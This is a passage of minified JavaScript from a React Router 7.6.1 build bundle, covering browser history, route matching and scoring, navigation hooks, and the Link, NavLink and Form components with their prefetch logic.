e&&e!=="?"&&(t+=e.charAt(0)==="?"?e:"?"+e),n&&n!=="#"&&(t+=n.charAt(0)==="#"?n:"#"+n),t}function Ha(t){let e={};if(t){let n=t.indexOf("#");n>=0&&(e.hash=t.substring(n),t=t.substring(0,n));let r=t.indexOf("?");r>=0&&(e.search=t.substring(r),t=t.substring(0,r)),t&&(e.pathname=t)}return e}function pP(t,e,n,r={}){let{window:i=document.defaultView,v5Compat:o=!1}=r,l=i.history,c="POP",u=null,f=d();f==null&&(f=0,l.replaceState({...l.state,idx:f},""));function d(){return(l.state||{idx:null}).idx}function y(){c="POP";let m=d(),x=m==null?null:m-f;f=m,u&&u({action:c,location:b.location,delta:x})}function g(m,x){c="PUSH";let S=dy(b.location,m,x);f=d()+1;let O=x1(S,f),$=b.createHref(S);try{l.pushState(O,"",$)}catch(R){if(R instanceof DOMException&&R.name==="DataCloneError")throw R;i.location.assign($)}o&&u&&u({action:c,location:b.location,delta:1})}function E(m,x){c="REPLACE";let S=dy(b.location,m,x);f=d();let O=x1(S,f),$=b.createHref(S);l.replaceState(O,"",$),o&&u&&u({action:c,location:b.location,delta:0})}function w(m){return gP(m)}let b={get action(){return c},get location(){return t(i,l)},listen(m){if(u)throw new Error("A history only accepts one active listener");return i.addEventListener(E1,y),u=m,()=>{i.removeEventListener(E1,y),u=null}},createHref(m){return e(i,m)},createURL:w,encodeLocation(m){let x=w(m);return{pathname:x.pathname,search:x.search,hash:x.hash}},push:g,replace:E,go(m){return l.go(m)}};return b}function gP(t,e=!1){let n="http://localhost";typeof window<"u"&&(n=window.location.origin!=="null"?window.location.origin:window.location.href),vt(n,"No window.location.(origin|href) available to create URL");let r=typeof t=="string"?t:mc(t);return r=r.replace(/ $/,"%20"),!e&&r.startsWith("//")&&(r=n+r),new URL(r,n)}function Fx(t,e,n="/"){return yP(t,e,n,!1)}function yP(t,e,n,r){let i=typeof e=="string"?Ha(e):e,o=Ni(i.pathname||"/",n);if(o==null)return null;let l=zx(t);mP(l);let c=null;for(let u=0;c==null&&u<l.length;++u){let f=PP(o);c=OP(l[u],f,r)}return c}function zx(t,e=[],n=[],r=""){let i=(o,l,c)=>{let u={relativePath:c===void 0?o.path||"":c,caseSensitive:o.caseSensitive===!0,childrenIndex:l,route:o};u.relativePath.startsWith("/")&&(vt(u.relativePath.startsWith(r),`Absolute route path "${u.relativePath}" nested under path "${r}" is not valid. An absolute child route path must start with the combined path of all its parent routes.`),u.relativePath=u.relativePath.slice(r.length));let f=Ti([r,u.relativePath]),d=n.concat(u);o.children&&o.children.length>0&&(vt(o.index!==!0,`Index routes must not have child routes. Please remove all child routes from route path "${f}".`),zx(o.children,e,d,f)),!(o.path==null&&!o.index)&&e.push({path:f,score:_P(f,o.index),routesMeta:d})};return t.forEach((o,l)=>{var c;if(o.path===""||!((c=o.path)!=null&&c.includes("?")))i(o,l);else for(let u of qx(o.path))i(o,l,u)}),e}function qx(t){let e=t.split("/");if(e.length===0)return[];let[n,...r]=e,i=n.endsWith("?"),o=n.replace(/\?$/,"");if(r.length===0)return i?[o,""]:[o];let l=qx(r.join("/")),c=[];return c.push(...l.map(u=>u===""?o:[o,u].join("/"))),i&&c.push(...l),c.map(u=>t.startsWith("/")&&u===""?"/":u)}function mP(t){t.sort((e,n)=>e.score!==n.score?n.score-e.score:IP(e.routesMeta.map(r=>r.childrenIndex),n.routesMeta.map(r=>r.childrenIndex)))}var wP=/^:[\w-]+$/,vP=3,bP=2,EP=1,xP=10,SP=-2,S1=t=>t==="*";function _P(t,e){let n=t.split("/"),r=n.length;return n.some(S1)&&(r+=SP),e&&(r+=bP),n.filter(i=>!S1(i)).reduce((i,o)=>i+(wP.test(o)?vP:o===""?EP:xP),r)}function IP(t,e){return t.length===e.length&&t.slice(0,-1).every((r,i)=>r===e[i])?t[t.length-1]-e[e.length-1]:0}function OP(t,e,n=!1){let{routesMeta:r}=t,i={},o="/",l=[];for(let c=0;c<r.length;++c){let u=r[c],f=c===r.length-1,d=o==="/"?e:e.slice(o.length)||"/",y=Zh({path:u.relativePath,caseSensitive:u.caseSensitive,end:f},d),g=u.route;if(!y&&f&&n&&!r[r.length-1].route.index&&(y=Zh({path:u.relativePath,caseSensitive:u.caseSensitive,end:!1},d)),!y)return null;Object.assign(i,y.params),l.push({params:i,pathname:Ti([o,y.pathname]),pathnameBase:RP(Ti([o,y.pathnameBase])),route:g}),y.pathnameBase!=="/"&&(o=Ti([o,y.pathnameBase]))}return l}function Zh(t,e){typeof t=="string"&&(t={path:t,caseSensitive:!1,end:!0});let[n,r]=$P(t.path,t.caseSensitive,t.end),i=e.match(n);if(!i)return null;let o=i[0],l=o.replace(/(.)\/+$/,"$1"),c=i.slice(1);return{params:r.reduce((f,{paramName:d,isOptional:y},g)=>{if(d==="*"){let w=c[g]||"";l=o.slice(0,o.length-w.length).replace(/(.)\/+$/,"$1")}const E=c[g];return y&&!E?f[d]=void 0:f[d]=(E||"").replace(/%2F/g,"/"),f},{}),pathname:o,pathnameBase:l,pattern:t}}function $P(t,e=!1,n=!0){ei(t==="*"||!t.endsWith("*")||t.endsWith("/*"),`Route path "${t}" will be treated as if it were "${t.replace(/\*$/,"/*")}" because the \`*\` character must always follow a \`/\` in the pattern. To get rid of this warning, please change the route path to "${t.replace(/\*$/,"/*")}".`);let r=[],i="^"+t.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(l,c,u)=>(r.push({paramName:c,isOptional:u!=null}),u?"/?([^\\/]+)?":"/([^\\/]+)"));return t.endsWith("*")?(r.push({paramName:"*"}),i+=t==="*"||t==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):n?i+="\\/*$":t!==""&&t!=="/"&&(i+="(?:(?=\\/|$))"),[new RegExp(i,e?void 0:"i"),r]}function PP(t){try{return t.split("/").map(e=>decodeURIComponent(e).replace(/\//g,"%2F")).join("/")}catch(e){return ei(!1,`The URL path "${t}" could not be decoded because it is a malformed URL segment. This is probably due to a bad percent encoding (${e}).`),t}}function Ni(t,e){if(e==="/")return t;if(!t.toLowerCase().startsWith(e.toLowerCase()))return null;let n=e.endsWith("/")?e.length-1:e.length,r=t.charAt(n);return r&&r!=="/"?null:t.slice(n)||"/"}function TP(t,e="/"){let{pathname:n,search:r="",hash:i=""}=typeof t=="string"?Ha(t):t;return{pathname:n?n.startsWith("/")?n:AP(n,e):e,search:DP(r),hash:NP(i)}}function AP(t,e){let n=e.replace(/\/+$/,"").split("/");return t.split("/").forEach(i=>{i===".."?n.length>1&&n.pop():i!=="."&&n.push(i)}),n.length>1?n.join("/"):"/"}function Zp(t,e,n,r){return`Cannot include a '${t}' character in a manually specified \`to.${e}\` field [${JSON.stringify(r)}].  Please separate it out to the \`to.${n}\` field. Alternatively you may provide the full path as a string in <Link to="..."> and the router will parse it for you.`}function CP(t){return t.filter((e,n)=>n===0||e.route.path&&e.route.path.length>0)}function Hx(t){let e=CP(t);return e.map((n,r)=>r===e.length-1?n.pathname:n.pathnameBase)}function Vx(t,e,n,r=!1){let i;typeof t=="string"?i=Ha(t):(i={...t},vt(!i.pathname||!i.pathname.includes("?"),Zp("?","pathname","search",i)),vt(!i.pathname||!i.pathname.includes("#"),Zp("#","pathname","hash",i)),vt(!i.search||!i.search.includes("#"),Zp("#","search","hash",i)));let o=t===""||i.pathname==="",l=o?"/":i.pathname,c;if(l==null)c=n;else{let y=e.length-1;if(!r&&l.startsWith("..")){let g=l.split("/");for(;g[0]==="..";)g.shift(),y-=1;i.pathname=g.join("/")}c=y>=0?e[y]:"/"}let u=TP(i,c),f=l&&l!=="/"&&l.endsWith("/"),d=(o||l===".")&&n.endsWith("/");return!u.pathname.endsWith("/")&&(f||d)&&(u.pathname+="/"),u}var Ti=t=>t.join("/").replace(/\/\/+/g,"/"),RP=t=>t.replace(/\/+$/,"").replace(/^\/*/,"/"),DP=t=>!t||t==="?"?"":t.startsWith("?")?t:"?"+t,NP=t=>!t||t==="#"?"":t.startsWith("#")?t:"#"+t;function kP(t){return t!=null&&typeof t.status=="number"&&typeof t.statusText=="string"&&typeof t.internal=="boolean"&&"data"in t}var Wx=["POST","PUT","PATCH","DELETE"];new Set(Wx);var BP=["GET",...Wx];new Set(BP);var Va=ue.createContext(null);Va.displayName="DataRouter";var wf=ue.createContext(null);wf.displayName="DataRouterState";var Kx=ue.createContext({isTransitioning:!1});Kx.displayName="ViewTransition";var LP=ue.createContext(new Map);LP.displayName="Fetchers";var jP=ue.createContext(null);jP.displayName="Await";var ni=ue.createContext(null);ni.displayName="Navigation";var Cc=ue.createContext(null);Cc.displayName="Location";var Bi=ue.createContext({outlet:null,matches:[],isDataRoute:!1});Bi.displayName="Route";var km=ue.createContext(null);km.displayName="RouteError";function UP(t,{relative:e}={}){vt(Rc(),"useHref() may be used only in the context of a <Router> component.");let{basename:n,navigator:r}=ue.useContext(ni),{hash:i,pathname:o,search:l}=Dc(t,{relative:e}),c=o;return n!=="/"&&(c=o==="/"?n:Ti([n,o])),r.createHref({pathname:c,search:l,hash:i})}function Rc(){return ue.useContext(Cc)!=null}function uo(){return vt(Rc(),"useLocation() may be used only in the context of a <Router> component."),ue.useContext(Cc).location}var Gx="You should call navigate() in a React.useEffect(), not when your component is first rendered.";function Yx(t){ue.useContext(ni).static||ue.useLayoutEffect(t)}function MP(){let{isDataRoute:t}=ue.useContext(Bi);return t?XP():FP()}function FP(){vt(Rc(),"useNavigate() may be used only in the context of a <Router> component.");let t=ue.useContext(Va),{basename:e,navigator:n}=ue.useContext(ni),{matches:r}=ue.useContext(Bi),{pathname:i}=uo(),o=JSON.stringify(Hx(r)),l=ue.useRef(!1);return Yx(()=>{l.current=!0}),ue.useCallback((u,f={})=>{if(ei(l.current,Gx),!l.current)return;if(typeof u=="number"){n.go(u);return}let d=Vx(u,JSON.parse(o),i,f.relative==="path");t==null&&e!=="/"&&(d.pathname=d.pathname==="/"?e:Ti([e,d.pathname])),(f.replace?n.replace:n.push)(d,f.state,f)},[e,n,o,i,t])}ue.createContext(null);function Dc(t,{relative:e}={}){let{matches:n}=ue.useContext(Bi),{pathname:r}=uo(),i=JSON.stringify(Hx(n));return ue.useMemo(()=>Vx(t,JSON.parse(i),r,e==="path"),[t,i,r,e])}function zP(t,e){return Jx(t,e)}function Jx(t,e,n,r){var x;vt(Rc(),"useRoutes() may be used only in the context of a <Router> component.");let{navigator:i}=ue.useContext(ni),{matches:o}=ue.useContext(Bi),l=o[o.length-1],c=l?l.params:{},u=l?l.pathname:"/",f=l?l.pathnameBase:"/",d=l&&l.route;{let S=d&&d.path||"";Zx(u,!d||S.endsWith("*")||S.endsWith("*?"),`You rendered descendant <Routes> (or called \`useRoutes()\`) at "${u}" (under <Route path="${S}">) but the parent route path has no trailing "*". This means if you navigate deeper, the parent won't match anymore and therefore the child routes will never render.

Please change the parent <Route path="${S}"> to <Route path="${S==="/"?"*":`${S}/*`}">.`)}let y=uo(),g;if(e){let S=typeof e=="string"?Ha(e):e;vt(f==="/"||((x=S.pathname)==null?void 0:x.startsWith(f)),`When overriding the location using \`<Routes location>\` or \`useRoutes(routes, location)\`, the location pathname must begin with the portion of the URL pathname that was matched by all parent routes. The current pathname base is "${f}" but pathname "${S.pathname}" was given in the \`location\` prop.`),g=S}else g=y;let E=g.pathname||"/",w=E;if(f!=="/"){let S=f.replace(/^\//,"").split("/");w="/"+E.replace(/^\//,"").split("/").slice(S.length).join("/")}let b=Fx(t,{pathname:w});ei(d||b!=null,`No routes matched location "${g.pathname}${g.search}${g.hash}" `),ei(b==null||b[b.length-1].route.element!==void 0||b[b.length-1].route.Component!==void 0||b[b.length-1].route.lazy!==void 0,`Matched leaf route at location "${g.pathname}${g.search}${g.hash}" does not have an element or Component. This means it will render an <Outlet /> with a null value by default resulting in an "empty" page.`);let m=KP(b&&b.map(S=>Object.assign({},S,{params:Object.assign({},c,S.params),pathname:Ti([f,i.encodeLocation?i.encodeLocation(S.pathname).pathname:S.pathname]),pathnameBase:S.pathnameBase==="/"?f:Ti([f,i.encodeLocation?i.encodeLocation(S.pathnameBase).pathname:S.pathnameBase])})),o,n,r);return e&&m?ue.createElement(Cc.Provider,{value:{location:{pathname:"/",search:"",hash:"",state:null,key:"default",...g},navigationType:"POP"}},m):m}function qP(){let t=QP(),e=kP(t)?`${t.status} ${t.statusText}`:t instanceof Error?t.message:JSON.stringify(t),n=t instanceof Error?t.stack:null,r="rgba(200,200,200, 0.5)",i={padding:"0.5rem",backgroundColor:r},o={padding:"2px 4px",backgroundColor:r},l=null;return console.error("Error handled by React Router default ErrorBoundary:",t),l=ue.createElement(ue.Fragment,null,ue.createElement("p",null,"💿 Hey developer 👋"),ue.createElement("p",null,"You can provide a way better UX than this when your app throws errors by providing your own ",ue.createElement("code",{style:o},"ErrorBoundary")," or"," ",ue.createElement("code",{style:o},"errorElement")," prop on your route.")),ue.createElement(ue.Fragment,null,ue.createElement("h2",null,"Unexpected Application Error!"),ue.createElement("h3",{style:{fontStyle:"italic"}},e),n?ue.createElement("pre",{style:i},n):null,l)}var HP=ue.createElement(qP,null),VP=class extends ue.Component{constructor(t){super(t),this.state={location:t.location,revalidation:t.revalidation,error:t.error}}static getDerivedStateFromError(t){return{error:t}}static getDerivedStateFromProps(t,e){return e.location!==t.location||e.revalidation!=="idle"&&t.revalidation==="idle"?{error:t.error,location:t.location,revalidation:t.revalidation}:{error:t.error!==void 0?t.error:e.error,location:e.location,revalidation:t.revalidation||e.revalidation}}componentDidCatch(t,e){console.error("React Router caught the following error during render",t,e)}render(){return this.state.error!==void 0?ue.createElement(Bi.Provider,{value:this.props.routeContext},ue.createElement(km.Provider,{value:this.state.error,children:this.props.component})):this.props.children}};function WP({routeContext:t,match:e,children:n}){let r=ue.useContext(Va);return r&&r.static&&r.staticContext&&(e.route.errorElement||e.route.ErrorBoundary)&&(r.staticContext._deepestRenderedBoundaryId=e.route.id),ue.createElement(Bi.Provider,{value:t},n)}function KP(t,e=[],n=null,r=null){if(t==null){if(!n)return null;if(n.errors)t=n.matches;else if(e.length===0&&!n.initialized&&n.matches.length>0)t=n.matches;else return null}let i=t,o=n==null?void 0:n.errors;if(o!=null){let u=i.findIndex(f=>f.route.id&&(o==null?void 0:o[f.route.id])!==void 0);vt(u>=0,`Could not find a matching route for errors on route IDs: ${Object.keys(o).join(",")}`),i=i.slice(0,Math.min(i.length,u+1))}let l=!1,c=-1;if(n)for(let u=0;u<i.length;u++){let f=i[u];if((f.route.HydrateFallback||f.route.hydrateFallbackElement)&&(c=u),f.route.id){let{loaderData:d,errors:y}=n,g=f.route.loader&&!d.hasOwnProperty(f.route.id)&&(!y||y[f.route.id]===void 0);if(f.route.lazy||g){l=!0,c>=0?i=i.slice(0,c+1):i=[i[0]];break}}}return i.reduceRight((u,f,d)=>{let y,g=!1,E=null,w=null;n&&(y=o&&f.route.id?o[f.route.id]:void 0,E=f.route.errorElement||HP,l&&(c<0&&d===0?(Zx("route-fallback",!1,"No `HydrateFallback` element provided to render during initial hydration"),g=!0,w=null):c===d&&(g=!0,w=f.route.hydrateFallbackElement||null)));let b=e.concat(i.slice(0,d+1)),m=()=>{let x;return y?x=E:g?x=w:f.route.Component?x=ue.createElement(f.route.Component,null):f.route.element?x=f.route.element:x=u,ue.createElement(WP,{match:f,routeContext:{outlet:u,matches:b,isDataRoute:n!=null},children:x})};return n&&(f.route.ErrorBoundary||f.route.errorElement||d===0)?ue.createElement(VP,{location:n.location,revalidation:n.revalidation,component:E,error:y,children:m(),routeContext:{outlet:null,matches:b,isDataRoute:!0}}):m()},null)}function Bm(t){return`${t} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`}function GP(t){let e=ue.useContext(Va);return vt(e,Bm(t)),e}function YP(t){let e=ue.useContext(wf);return vt(e,Bm(t)),e}function JP(t){let e=ue.useContext(Bi);return vt(e,Bm(t)),e}function Lm(t){let e=JP(t),n=e.matches[e.matches.length-1];return vt(n.route.id,`${t} can only be used on routes that contain a unique "id"`),n.route.id}function ZP(){return Lm("useRouteId")}function QP(){var r;let t=ue.useContext(km),e=YP("useRouteError"),n=Lm("useRouteError");return t!==void 0?t:(r=e.errors)==null?void 0:r[n]}function XP(){let{router:t}=GP("useNavigate"),e=Lm("useNavigate"),n=ue.useRef(!1);return Yx(()=>{n.current=!0}),ue.useCallback(async(i,o={})=>{ei(n.current,Gx),n.current&&(typeof i=="number"?t.navigate(i):await t.navigate(i,{fromRouteId:e,...o}))},[t,e])}var _1={};function Zx(t,e,n){!e&&!_1[t]&&(_1[t]=!0,ei(!1,n))}ue.memo(eT);function eT({routes:t,future:e,state:n}){return Jx(t,void 0,n,e)}function da(t){vt(!1,"A <Route> is only ever to be used as the child of <Routes> element, never rendered directly. Please wrap your <Route> in a <Routes>.")}function tT({basename:t="/",children:e=null,location:n,navigationType:r="POP",navigator:i,static:o=!1}){vt(!Rc(),"You cannot render a <Router> inside another <Router>. You should never have more than one in your app.");let l=t.replace(/^\/*/,"/"),c=ue.useMemo(()=>({basename:l,navigator:i,static:o,future:{}}),[l,i,o]);typeof n=="string"&&(n=Ha(n));let{pathname:u="/",search:f="",hash:d="",state:y=null,key:g="default"}=n,E=ue.useMemo(()=>{let w=Ni(u,l);return w==null?null:{location:{pathname:w,search:f,hash:d,state:y,key:g},navigationType:r}},[l,u,f,d,y,g,r]);return ei(E!=null,`<Router basename="${l}"> is not able to match the URL "${u}${f}${d}" because it does not start with the basename, so the <Router> won't render anything.`),E==null?null:ue.createElement(ni.Provider,{value:c},ue.createElement(Cc.Provider,{children:e,value:E}))}function nT({children:t,location:e}){return zP(py(t),e)}function py(t,e=[]){let n=[];return ue.Children.forEach(t,(r,i)=>{if(!ue.isValidElement(r))return;let o=[...e,i];if(r.type===ue.Fragment){n.push.apply(n,py(r.props.children,o));return}vt(r.type===da,`[${typeof r.type=="string"?r.type:r.type.name}] is not a <Route> component. All component children of <Routes> must be a <Route> or <React.Fragment>`),vt(!r.props.index||!r.props.children,"An index route cannot have child routes.");let l={id:r.props.id||o.join("-"),caseSensitive:r.props.caseSensitive,element:r.props.element,Component:r.props.Component,index:r.props.index,path:r.props.path,loader:r.props.loader,action:r.props.action,hydrateFallbackElement:r.props.hydrateFallbackElement,HydrateFallback:r.props.HydrateFallback,errorElement:r.props.errorElement,ErrorBoundary:r.props.ErrorBoundary,hasErrorBoundary:r.props.hasErrorBoundary===!0||r.props.ErrorBoundary!=null||r.props.errorElement!=null,shouldRevalidate:r.props.shouldRevalidate,handle:r.props.handle,lazy:r.props.lazy};r.props.children&&(l.children=py(r.props.children,o)),n.push(l)}),n}var Lh="get",jh="application/x-www-form-urlencoded";function vf(t){return t!=null&&typeof t.tagName=="string"}function rT(t){return vf(t)&&t.tagName.toLowerCase()==="button"}function iT(t){return vf(t)&&t.tagName.toLowerCase()==="form"}function sT(t){return vf(t)&&t.tagName.toLowerCase()==="input"}function oT(t){return!!(t.metaKey||t.altKey||t.ctrlKey||t.shiftKey)}function aT(t,e){return t.button===0&&(!e||e==="_self")&&!oT(t)}var fh=null;function lT(){if(fh===null)try{new FormData(document.createElement("form"),0),fh=!1}catch{fh=!0}return fh}var cT=new Set(["application/x-www-form-urlencoded","multipart/form-data","text/plain"]);function Qp(t){return t!=null&&!cT.has(t)?(ei(!1,`"${t}" is not a valid \`encType\` for \`<Form>\`/\`<fetcher.Form>\` and will default to "${jh}"`),null):t}function uT(t,e){let n,r,i,o,l;if(iT(t)){let c=t.getAttribute("action");r=c?Ni(c,e):null,n=t.getAttribute("method")||Lh,i=Qp(t.getAttribute("enctype"))||jh,o=new FormData(t)}else if(rT(t)||sT(t)&&(t.type==="submit"||t.type==="image")){let c=t.form;if(c==null)throw new Error('Cannot submit a <button> or <input type="submit"> without a <form>');let u=t.getAttribute("formaction")||c.getAttribute("action");if(r=u?Ni(u,e):null,n=t.getAttribute("formmethod")||c.getAttribute("method")||Lh,i=Qp(t.getAttribute("formenctype"))||Qp(c.getAttribute("enctype"))||jh,o=new FormData(c,t),!lT()){let{name:f,type:d,value:y}=t;if(d==="image"){let g=f?`${f}.`:"";o.append(`${g}x`,"0"),o.append(`${g}y`,"0")}else f&&o.append(f,y)}}else{if(vf(t))throw new Error('Cannot submit element that is not <form>, <button>, or <input type="submit|image">');n=Lh,r=null,i=jh,l=t}return o&&i==="text/plain"&&(l=o,o=void 0),{action:r,method:n.toLowerCase(),encType:i,formData:o,body:l}}function jm(t,e){if(t===!1||t===null||typeof t>"u")throw new Error(e)}async function hT(t,e){if(t.id in e)return e[t.id];try{let n=await import(t.module);return e[t.id]=n,n}catch(n){return console.error(`Error loading route module \`${t.module}\`, reloading page...`),console.error(n),window.__reactRouterContext&&window.__reactRouterContext.isSpaMode,window.location.reload(),new Promise(()=>{})}}function fT(t){return t==null?!1:t.href==null?t.rel==="preload"&&typeof t.imageSrcSet=="string"&&typeof t.imageSizes=="string":typeof t.rel=="string"&&typeof t.href=="string"}async function dT(t,e,n){let r=await Promise.all(t.map(async i=>{let o=e.routes[i.route.id];if(o){let l=await hT(o,n);return l.links?l.links():[]}return[]}));return mT(r.flat(1).filter(fT).filter(i=>i.rel==="stylesheet"||i.rel==="preload").map(i=>i.rel==="stylesheet"?{...i,rel:"prefetch",as:"style"}:{...i,rel:"prefetch"}))}function I1(t,e,n,r,i,o){let l=(u,f)=>n[f]?u.route.id!==n[f].route.id:!0,c=(u,f)=>{var d;return n[f].pathname!==u.pathname||((d=n[f].route.path)==null?void 0:d.endsWith("*"))&&n[f].params["*"]!==u.params["*"]};return o==="assets"?e.filter((u,f)=>l(u,f)||c(u,f)):o==="data"?e.filter((u,f)=>{var y;let d=r.routes[u.route.id];if(!d||!d.hasLoader)return!1;if(l(u,f)||c(u,f))return!0;if(u.route.shouldRevalidate){let g=u.route.shouldRevalidate({currentUrl:new URL(i.pathname+i.search+i.hash,window.origin),currentParams:((y=n[0])==null?void 0:y.params)||{},nextUrl:new URL(t,window.origin),nextParams:u.params,defaultShouldRevalidate:!0});if(typeof g=="boolean")return g}return!0}):[]}function pT(t,e,{includeHydrateFallback:n}={}){return gT(t.map(r=>{let i=e.routes[r.route.id];if(!i)return[];let o=[i.module];return i.clientActionModule&&(o=o.concat(i.clientActionModule)),i.clientLoaderModule&&(o=o.concat(i.clientLoaderModule)),n&&i.hydrateFallbackModule&&(o=o.concat(i.hydrateFallbackModule)),i.imports&&(o=o.concat(i.imports)),o}).flat(1))}function gT(t){return[...new Set(t)]}function yT(t){let e={},n=Object.keys(t).sort();for(let r of n)e[r]=t[r];return e}function mT(t,e){let n=new Set;return new Set(e),t.reduce((r,i)=>{let o=JSON.stringify(yT(i));return n.has(o)||(n.add(o),r.push({key:o,link:i})),r},[])}Object.getOwnPropertyNames(Object.prototype).sort().join("\0");var wT=new Set([100,101,204,205]);function vT(t,e){let n=typeof t=="string"?new URL(t,typeof window>"u"?"server://singlefetch/":window.location.origin):t;return n.pathname==="/"?n.pathname="_root.data":e&&Ni(n.pathname,e)==="/"?n.pathname=`${e.replace(/\/$/,"")}/_root.data`:n.pathname=`${n.pathname.replace(/\/$/,"")}.data`,n}function Qx(){let t=ue.useContext(Va);return jm(t,"You must render this element inside a <DataRouterContext.Provider> element"),t}function bT(){let t=ue.useContext(wf);return jm(t,"You must render this element inside a <DataRouterStateContext.Provider> element"),t}var Um=ue.createContext(void 0);Um.displayName="FrameworkContext";function Xx(){let t=ue.useContext(Um);return jm(t,"You must render this element inside a <HydratedRouter> element"),t}function ET(t,e){let n=ue.useContext(Um),[r,i]=ue.useState(!1),[o,l]=ue.useState(!1),{onFocus:c,onBlur:u,onMouseEnter:f,onMouseLeave:d,onTouchStart:y}=e,g=ue.useRef(null);ue.useEffect(()=>{if(t==="render"&&l(!0),t==="viewport"){let b=x=>{x.forEach(S=>{l(S.isIntersecting)})},m=new IntersectionObserver(b,{threshold:.5});return g.current&&m.observe(g.current),()=>{m.disconnect()}}},[t]),ue.useEffect(()=>{if(r){let b=setTimeout(()=>{l(!0)},100);return()=>{clearTimeout(b)}}},[r]);let E=()=>{i(!0)},w=()=>{i(!1),l(!1)};return n?t!=="intent"?[o,g,{}]:[o,g,{onFocus:ql(c,E),onBlur:ql(u,w),onMouseEnter:ql(f,E),onMouseLeave:ql(d,w),onTouchStart:ql(y,E)}]:[!1,g,{}]}function ql(t,e){return n=>{t&&t(n),n.defaultPrevented||e(n)}}function xT({page:t,...e}){let{router:n}=Qx(),r=ue.useMemo(()=>Fx(n.routes,t,n.basename),[n.routes,t,n.basename]);return r?ue.createElement(_T,{page:t,matches:r,...e}):null}function ST(t){let{manifest:e,routeModules:n}=Xx(),[r,i]=ue.useState([]);return ue.useEffect(()=>{let o=!1;return dT(t,e,n).then(l=>{o||i(l)}),()=>{o=!0}},[t,e,n]),r}function _T({page:t,matches:e,...n}){let r=uo(),{manifest:i,routeModules:o}=Xx(),{basename:l}=Qx(),{loaderData:c,matches:u}=bT(),f=ue.useMemo(()=>I1(t,e,u,i,r,"data"),[t,e,u,i,r]),d=ue.useMemo(()=>I1(t,e,u,i,r,"assets"),[t,e,u,i,r]),y=ue.useMemo(()=>{if(t===r.pathname+r.search+r.hash)return[];let w=new Set,b=!1;if(e.forEach(x=>{var O;let S=i.routes[x.route.id];!S||!S.hasLoader||(!f.some($=>$.route.id===x.route.id)&&x.route.id in c&&((O=o[x.route.id])!=null&&O.shouldRevalidate)||S.hasClientLoader?b=!0:w.add(x.route.id))}),w.size===0)return[];let m=vT(t,l);return b&&w.size>0&&m.searchParams.set("_routes",e.filter(x=>w.has(x.route.id)).map(x=>x.route.id).join(",")),[m.pathname+m.search]},[l,c,r,i,f,e,t,o]),g=ue.useMemo(()=>pT(d,i),[d,i]),E=ST(d);return ue.createElement(ue.Fragment,null,y.map(w=>ue.createElement("link",{key:w,rel:"prefetch",as:"fetch",href:w,...n})),g.map(w=>ue.createElement("link",{key:w,rel:"modulepreload",href:w,...n})),E.map(({key:w,link:b})=>ue.createElement("link",{key:w,...b})))}function IT(...t){return e=>{t.forEach(n=>{typeof n=="function"?n(e):n!=null&&(n.current=e)})}}var eS=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u";try{eS&&(window.__reactRouterVersion="7.6.1")}catch{}function OT({basename:t,children:e,window:n}){let r=ue.useRef();r.current==null&&(r.current=fP({window:n,v5Compat:!0}));let i=r.current,[o,l]=ue.useState({action:i.action,location:i.location}),c=ue.useCallback(u=>{ue.startTransition(()=>l(u))},[l]);return ue.useLayoutEffect(()=>i.listen(c),[i,c]),ue.createElement(tT,{basename:t,children:e,location:o.location,navigationType:o.action,navigator:i})}var tS=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,ct=ue.forwardRef(function({onClick:e,discover:n="render",prefetch:r="none",relative:i,reloadDocument:o,replace:l,state:c,target:u,to:f,preventScrollReset:d,viewTransition:y,...g},E){let{basename:w}=ue.useContext(ni),b=typeof f=="string"&&tS.test(f),m,x=!1;if(typeof f=="string"&&b&&(m=f,eS))try{let k=new URL(window.location.href),G=f.startsWith("//")?new URL(k.protocol+f):new URL(f),W=Ni(G.pathname,w);G.origin===k.origin&&W!=null?f=W+G.search+G.hash:x=!0}catch{ei(!1,`<Link to="${f}"> contains an invalid URL which will probably break when clicked - please update to a valid URL path.`)}let S=UP(f,{relative:i}),[O,$,R]=ET(r,g),T=AT(f,{replace:l,state:c,target:u,preventScrollReset:d,relative:i,viewTransition:y});function D(k){e&&e(k),k.defaultPrevented||T(k)}let B=ue.createElement("a",{...g,...R,href:m||S,onClick:x||o?e:D,ref:IT(E,$),target:u,"data-discover":!b&&n==="render"?"true":void 0});return O&&!b?ue.createElement(ue.Fragment,null,B,ue.createElement(xT,{page:S})):B});ct.displayName="Link";var $T=ue.forwardRef(function({"aria-current":e="page",caseSensitive:n=!1,className:r="",end:i=!1,style:o,to:l,viewTransition:c,children:u,...f},d){let y=Dc(l,{relative:f.relative}),g=uo(),E=ue.useContext(wf),{navigator:w,basename:b}=ue.useContext(ni),m=E!=null&&kT(y)&&c===!0,x=w.encodeLocation?w.encodeLocation(y).pathname:y.pathname,S=g.pathname,O=E&&E.navigation&&E.navigation.location?E.navigation.location.pathname:null;n||(S=S.toLowerCase(),O=O?O.toLowerCase():null,x=x.toLowerCase()),O&&b&&(O=Ni(O,b)||O);const $=x!=="/"&&x.endsWith("/")?x.length-1:x.length;let R=S===x||!i&&S.startsWith(x)&&S.charAt($)==="/",T=O!=null&&(O===x||!i&&O.startsWith(x)&&O.charAt(x.length)==="/"),D={isActive:R,isPending:T,isTransitioning:m},B=R?e:void 0,k;typeof r=="function"?k=r(D):k=[r,R?"active":null,T?"pending":null,m?"transitioning":null].filter(Boolean).join(" ");let G=typeof o=="function"?o(D):o;return ue.createElement(ct,{...f,"aria-current":B,className:k,ref:d,style:G,to:l,viewTransition:c},typeof u=="function"?u(D):u)});$T.displayName="NavLink";var PT=ue.forwardRef(({discover:t="render",fetcherKey:e,navigate:n,reloadDocument:r,replace:i,state:o,method:l=Lh,action:c,onSubmit:u,relative:f,preventScrollReset:d,viewTransition:y,...g},E)=>{let w=DT(),b=NT(c,{relative:f}),m=l.toLowerCase()==="get"?"get":"post",x=typeof c=="string"&&tS.test(c),S=O=>{if(u&&u(O),O.defaultPrevented)return;O.preventDefault();let $=O.nativeEvent.submitter,R=($==null?void 0:$.getAttribute("formmethod"))||l;w($||O.currentTarget,{fetcherKey:e,method:R,navigate:n,replace:i,state:o,relative:f,preventScrollReset:d,viewTransition:y})};return ue.createElement("form",{ref:E,method:m,action:b,onSubmit:r?u:S,...g,"data-discover":!x&&t==="render"?"true":void 